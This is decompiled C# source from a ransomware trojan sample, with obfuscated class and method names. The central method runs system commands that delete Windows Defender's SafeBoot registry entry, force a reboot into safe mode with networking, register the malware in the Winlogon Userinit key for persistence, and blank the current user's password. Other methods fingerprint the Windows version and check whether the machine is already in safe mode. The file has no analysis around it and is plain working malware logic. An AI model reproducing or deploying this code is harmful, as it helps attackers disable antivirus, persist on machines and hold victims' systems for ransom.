// Decompiled with JetBrains decompiler
// Type: MufMaOSvGyvz.jMDFRLEyorejfI
// Assembly: Final-02.exe, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C3A0FEE4-03D5-43E6-BB9B-FAFC16FEF04E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.Win32.Generic-6a5090762c6058bc223e37e89f53832faad80995e3c5ed7e59ed9f5a5e604e47.exe

using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace MufMaOSvGyvz
{
  public class jMDFRLEyorejfI
  {
    [DllImport("user32.dll")]
    internal static extern int GetSystemMetrics(int int_0);

    public static string vgwIjtaVyLLgbVk()
    {
      OperatingSystem osVersion = Environment.OSVersion;
      Version version = osVersion.Version;
      string str = "";
      if (osVersion.Platform == PlatformID.Win32Windows)
      {
        switch (version.Minor)
        {
          case 0:
            str = "95";
            break;
          case 10:
            str = !(version.Revision.ToString() == "2222A") ? "98" : "98SE";
            break;
          case 90:
            str = "Me";
            break;
        }
      }
      else if (osVersion.Platform == PlatformID.Win32NT)
      {
        switch (version.Major)
        {
          case 3:
            str = "NT 3.51";
            break;
          case 4:
            str = "NT 4.0";
            break;
          case 5:
            str = version.Minor != 0 ? "XP" : "2000";
            break;
          case 6:
            str = version.Minor != 0 ? (version.Minor != 1 ? (version.Minor != 2 ? "8.1" : "8") : "7") : "Vista";
            break;
          case 10:
            str = "10";
            break;
        }
      }
      if (str != "")
      {
        str = "Windows " + str;
        if (osVersion.ServicePack != "")
          str = str + " " + osVersion.ServicePack;
      }
      return str;
    }

    public static bool tTkvXnIXBUwQ() => jMDFRLEyorejfI.GetSystemMetrics(67) != 0;

    public static void jIBYuxgbcSbmfjK()
    {
      IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("reg.exe", "delete HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\WinDefend /f");
      IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("bcdedit.exe", "/set {default} safeboot network");
      IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("reg.exe", "add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"" + Assembly.GetEntryAssembly().Location + "\",\"C:\\Windows\\system32\\userinit.exe\" /f");
      IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("net.exe", "user " + WindowsIdentity.GetCurrent().Name.Split('\\')[1] + " \"\"");
      IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("shutdown.exe", "/r /t 0");
    }

    public static void CFPjirxGMKMKPt()
    {
      if (jMDFRLEyorejfI.tTkvXnIXBUwQ())
        return;
      jMDFRLEyorejfI.jIBYuxgbcSbmfjK();
    }
  }
}
